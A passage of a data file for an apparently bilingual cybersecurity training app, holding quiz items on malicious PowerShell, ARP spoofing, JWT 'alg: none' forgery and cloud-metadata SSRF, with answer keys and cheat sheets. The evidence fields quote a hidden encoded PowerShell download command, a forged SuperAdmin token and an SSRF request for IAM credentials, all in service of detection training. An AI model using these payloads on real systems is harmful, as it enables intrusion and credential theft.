          'SMS and TOTP codes are vulnerable to real-time proxy interception.',
          'FIDO2/WebAuthn binds authentication cryptographically to the exact browser URL.',
          'Protect session cookies with HttpOnly, Secure, and SameSite=Strict attributes.'
        ]
      }
    ]
  },
  {
    id: 'malware-defense',
    title: 'Malware & Ransomware Defense',
    titleHinglish: 'Malware aur Ransomware Kill-Chain',
    icon: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="6"></circle><line x1="12" y1="2" x2="12" y2="6"></line><line x1="12" y1="18" x2="12" y2="22"></line><line x1="2" y1="12" x2="6" y2="12"></line><line x1="18" y1="12" x2="22" y2="12"></line></svg>',
    description: 'Deconstruct malicious macros, dropper stages, LOLBins (Living off the Land Binaries), and behavioral ransomware detection.',
    descriptionHinglish: 'Malicious scripts, PowerShell attacks, aur ransomware kill-chain ko forensic analysis se samjho.',
    activeLearners: 98,
    microTopics: ['Droppers & Stagers', 'Living off the Land (LOLBins)', 'PowerShell Obfuscation', 'Shadow Copy Deletion', 'Persistence Registry Run Keys'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Malicious File Formats & Social Engineering Hooks' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'Script Obfuscation, LOLBins & Sandbox Evasion' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Memory Triage, YARA Rules & Kill-Chain Dismantling' }
    ],
    diagnostics: [
      {
        id: 'q_mal_1',
        title: 'The Obfuscated PowerShell Command',
        titleHinglish: 'Chupa Hua PowerShell Command',
        microTopic: 'PowerShell Execution & Obfuscation',
        scenario: 'A SIEM alert triggers on an accounting workstation running this suspicious process command:',
        scenarioHinglish: 'Accounting computer par ek ajeeb command run hone ka alert aaya:',
        evidenceType: 'code',
        evidence: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQB4AGkAbAAuAHgAeQB6AC8AcAAuAHgAZQA=`,
        options: [
          {
            text: 'Normal Windows Update scheduled maintenance script.',
            textHinglish: 'Normal Windows Update ka daily background script hai.'
          },
          {
            text: 'Malicious: Base64-encoded command running hidden without profile to bypass execution policy and download a payload.',
            textHinglish: 'Malicious hai: Base64 mein chupa command jo chupke se internet se virus file download kar raha hai.'
          },
          {
            text: 'Benign: Microsoft Teams audio device driver calibration.',
            textHinglish: 'Microsoft Teams ka mic set karne wala code hai.'
          },
          {
            text: 'Database indexing task triggered by Microsoft Excel 365.',
            textHinglish: 'Excel sheet ka database refresh command hai.'
          }
        ],
        correctIndex: 1,
        el10: 'The attacker is telling the computer: "Do this secretly (-W Hidden), don’t ask for permission (-Exec Bypass), and I scrambled the words into code (-enc) so the teacher can’t read it."',
        el10Hinglish: 'Attacker computer ko chupke se keh raha hai: "Bina kisi ko bataye parde ke peeche kaam karo, koi permission mat maango, aur maine language encode kar di hai taaki koi samajh na sake."',
        soWhat: 'Executing arbitrary encoded scripts allows initial access brokers to drop cobalt strike beacons or ransomware encryptors across the domain.',
        remediationQuery: 'powershell base64 encoded command malware analysis',
        videoId: 'lzaW5y_pW8M',
        videoTitle: 'Analyzing Obfuscated PowerShell Attacks',
        cheatSheet: [
          '-NoP means NoProfile (skips default user scripts to load faster).',
          '-W Hidden hides the command window from the logged-in victim.',
          'Constrained Language Mode (CLM) and Script Block Logging neutralize encoded attacks.'
        ]
      }
    ]
  },
  {
    id: 'network-exploitation',
    title: 'Network Exploitation & Sniffing',
    titleHinglish: 'Network Sniffing aur Traffic Forensics',
    icon: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>',
    description: 'Analyze ARP cache poisoning, rogue DHCP servers, Wireshark packet captures, and TLS stripping attacks.',
    descriptionHinglish: 'Wireshark packet analysis, Man-in-the-middle attacks, aur network packet sniffing ki deep knowledge.',
    activeLearners: 115,
    microTopics: ['ARP Poisoning', 'DNS Cache Poisoning', 'TLS Certificate Validation', 'Wireshark PCAP Triage', 'Port Knocking & Nmap Forensics'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Unencrypted Protocols (HTTP, FTP, Telnet)' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'Layer 2 MITM & Packet Tampering' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Network Triage, PCAP Carving & Port Hardening' }
    ],
    diagnostics: [
      {
        id: 'q_net_1',
        title: 'The Default Gateway MAC Address Flip',
        titleHinglish: 'MAC Address Duplicate Ho Gaya (ARP Spoofing)',
        microTopic: 'ARP Cache Poisoning (Layer 2 MITM)',
        scenario: 'An admin inspects the local machine ARP table after users complain of slow internet and security warnings:',
        scenarioHinglish: 'Users ne complain kiya ki internet ajeeb behave kar raha hai. Admin ne ARP table check ki:',
        evidenceType: 'logs',
        evidence: `Internet Address      Physical Address      Type
192.168.1.1           00-14-22-01-23-45     dynamic (Default Gateway)
192.168.1.55          00-14-22-01-23-45     dynamic (Workstation-Sales-PC)
192.168.1.100         e4-a7-a0-99-bb-12     dynamic`,
        options: [
          {
            text: 'Normal: High-availability router clustering mirrors MAC addresses for redundancy.',
            textHinglish: 'Normal hai: Router speed badhane ke liye MAC address duplicate karta hai.'
          },
          {
            text: 'ARP Poisoning Attack: Workstation 192.168.1.55 has spoofed the router gateway MAC to intercept all outbound traffic.',
            textHinglish: 'ARP Poisoning Attack hai: Workstation .55 ne router ka roop le liya hai taaki sara internet traffic uske through nikle.'
          },
          {
            text: 'DHCP IP exhaustion error caused by too many Wi-Fi guest devices.',
            textHinglish: 'Wi-Fi par zyada guests aane se network confuse ho gaya.'
          },
          {
            text: 'DNS amplification attack directed at port 53.',
            textHinglish: 'DNS server par DDoS attack ho raha hai.'
          }
        ],
        correctIndex: 1,
        el10: 'Imagine if someone stood in your classroom shouting: "I am the teacher!" whenever anyone asks a question. That is ARP spoofing.',
        el10Hinglish: 'Classroom mein ek naughty student khada hokar bolne laga: "Main hi teacher hoon, saare homework mujhe do!" Ye ARP spoofing hai.',
        soWhat: 'An attacker positioned as default gateway can decrypt, modify, or inject payloads into unencrypted local network traffic.',
        remediationQuery: 'arp spoofing detection dynamic arp inspection switch',
        videoId: 'uIwXn3y3aV8',
        videoTitle: 'ARP Spoofing Explained in 5 Minutes',
        cheatSheet: [
          'Two different IP addresses mapped to the exact same MAC address is the hallmark of ARP poisoning.',
          'Dynamic ARP Inspection (DAI) on managed switches stops spoofed gratuitous ARP replies.',
          'Static ARP tables or 802.1X port security provide enterprise network defense.'
        ]
      }
    ]
  },
  {
    id: 'identity-token',
    title: 'Identity, Auth & Token Hijacking',
    titleHinglish: 'JWT Tokens aur Session Hijacking',
    icon: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 2l-2 2m-1.5 1.5L10 13l-4 4-2-2-4 4 4 4 2-2 4-4 7.5-7.5"></path></svg>',
    description: 'Inspect JWT tokens, signature tampering (alg: none), session fixation, OAuth token theft, and Passkey security.',
    descriptionHinglish: 'JWT security, token replay attacks, cookies, aur modern Passkeys ka complete guide.',
    activeLearners: 84,
    microTopics: ['JWT alg:none Exploit', 'Session Replay', 'OAuth Redirect URI Manipulation', 'Refresh Token Rotation', 'Passkey WebAuthn'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Basic Auth vs Bearer Tokens vs Cookies' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'Token Structure & Cryptographic Signatures' },
      { id: 3, name: 'Level 3: Mastery', focus: 'OAuth Hardening & Zero-Trust Token Validation' }
    ],
    diagnostics: [
      {
        id: 'q_id_1',
        title: 'The Unsigned "alg": "none" Token',
        titleHinglish: 'Bina Signature Wala JWT Token (alg: none)',
        microTopic: 'JWT Signature Verification Bypass',
        scenario: 'A security engineer intercepts an authentication token sent in the Authorization header:',
        scenarioHinglish: 'Security test ke dauran ek user ka JWT token dekha gaya:',
        evidenceType: 'code',
        evidence: `Header:  {"alg": "none", "typ": "JWT"}
Payload: {"sub": "1002", "name": "Intern", "role": "SuperAdmin", "exp": 1999999999}
Signature: (empty string after trailing period)`,
        options: [
          {
            text: 'Safe: "alg": "none" is the modern IETF high-speed encryption standard for cloud microservices.',
            textHinglish: 'Safe hai: "none" ka matlab cloud speed ke liye automatic secure validation.'
          },
          {
            text: 'Vulnerable: The token explicitly disables signature verification; vulnerable backends will trust modified roles like SuperAdmin.',
            textHinglish: 'Vulnerable hai: Signature ko "none" karke bypass kiya gaya hai. Kamzor backend ise bina check kiye SuperAdmin maan lega!'
          },
          {
            text: 'Malformed: The token is corrupted and will immediately crash the HTTP server parser.',
            textHinglish: 'Token kharab ho chuka hai aur server par 500 error aayega.'
          },
          {
            text: 'Safe: The expiration timestamp is in the future, proving cryptographic validity.',
            textHinglish: 'Safe hai: Expiry date future ki hai isliye valid hai.'
          }
        ],
        correctIndex: 1,
        el10: 'A JWT token is like a hall pass stamped by the principal. If the student writes "Stamp: None" and changes their grade to A+, a bad teacher will just believe it without checking the stamp!',
        el10Hinglish: 'JWT token principal ke stamp wale school pass jaisa hai. Agar student stamp ki jagah likh de "Stamp: None" aur khud ko School Headboy bana le, aur teacher maan le—to ye "alg: none" flaw hai!',
        soWhat: 'Attackers can elevate themselves to full administrator privileges across APIs without knowing any secret keys.',
        remediationQuery: 'jwt alg none vulnerability fix jwt verification',
        videoId: '7Q17ubqLfaM',
        videoTitle: 'JWT Security Vulnerabilities: Alg None & Key Confusion',
        cheatSheet: [
          'Never accept tokens with "alg": "none" in production.',
          'Always whitelist expected algorithms (e.g. RS256, Ed25519) on the server.',
          'Keep JWT secrets long, random, and stored in secure secret vaults.'
        ]
      }
    ]
  },
  {
    id: 'cloud-security',
    title: 'Cloud Infrastructure Security',
    titleHinglish: 'Cloud Security aur IAM Misconfiguration',
    icon: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"></path></svg>',
    description: 'Investigate public Cloud Storage bucket leaks, IAM privilege escalation, SSRF attacks on metadata services, and Kubernetes RBAC.',
    descriptionHinglish: 'AWS/GCP bucket leaks, IAM permissions, metadata service attacks, aur Cloud forensic security.',
    activeLearners: 129,
    microTopics: ['Public S3/GCS Buckets', 'IMDSv1 vs IMDSv2 SSRF', 'IAM Wildcard Permissions', 'CloudTrail Log Tampering', 'Container Escape'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Public Cloud Asset Discovery' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'SSRF & Cloud Metadata Token Harvesting' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Least Privilege IAM Policies & Guardrails' }
    ],
    diagnostics: [
      {
        id: 'q_cloud_1',
        title: 'The 169.254.169.254 Metadata Pivot',
        titleHinglish: 'Cloud Metadata IP (169.254.169.254) Attack',
        microTopic: 'Server-Side Request Forgery (SSRF) on Cloud IMDS',
        scenario: 'A web application has a profile picture import feature from a user-supplied URL. An attacker enters this URL in the box:',
        scenarioHinglish: 'Profile picture upload URL box mein attacker ne ye address daala:',
        evidenceType: 'code',
        evidence: `POST /api/profile/import-avatar
Host: app.megacorp.cloud
Content-Type: application/json

{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role"}`,
        options: [
          {
            text: 'Benign: It attempts to load an avatar from an internal loopback webcam.',
            textHinglish: 'Normal hai: Local webcam se photo lene ki koshish hai.'
          },
          {
            text: 'SSRF Attack: The server will fetch its own cloud metadata service and return temporary AWS/GCP IAM credentials to the attacker.',
            textHinglish: 'SSRF Attack hai: Server apne hi cloud metadata IP ko call karega aur attacker ko cloud ke admin credentials de dega!'
          },
          {
            text: 'DDoS: 169.254.169.254 is a broadcast ping address that overwhelms local switches.',
            textHinglish: 'Network switch par load badhane wala DDoS trick hai.'
          },
          {
            text: 'Safe: Cloud security groups automatically block all HTTP traffic on port 80.',
            textHinglish: 'Safe hai: Cloud firewall automatically internal IP block kar deta hai.'
          }
        ],
        correctIndex: 1,
        el10: 'You asked the company robot butler to go fetch a picture, but you tricked the butler into walking into the manager\'s secret office and photocopying the master keys!',
        el10Hinglish: 'Tumne company ke robot se kaha "mere liye photo laao", lekin robot ko manager ke secret locker ka address de diya jahan se wo master chabi chura laya!',
        soWhat: 'This SSRF technique was the exact method used in the Capital One breach affecting over 100 million customer records.',
        remediationQuery: 'ssrf aws metadata imdsv2 prevention',
        videoId: '8W8X2qK4x9Y',
        videoTitle: 'How Hackers Steal Cloud Keys with SSRF',
        cheatSheet: [
          '169.254.169.254 is the link-local Cloud Instance Metadata Service (IMDS).',
          'Enforce IMDSv2 (requires session token header PUT) to neutralize simple SSRF.',
          'Disable HTTP URL fetchers or validate against private IP address ranges (RFC 1918).'
        ]
      }
    ]
  }
];
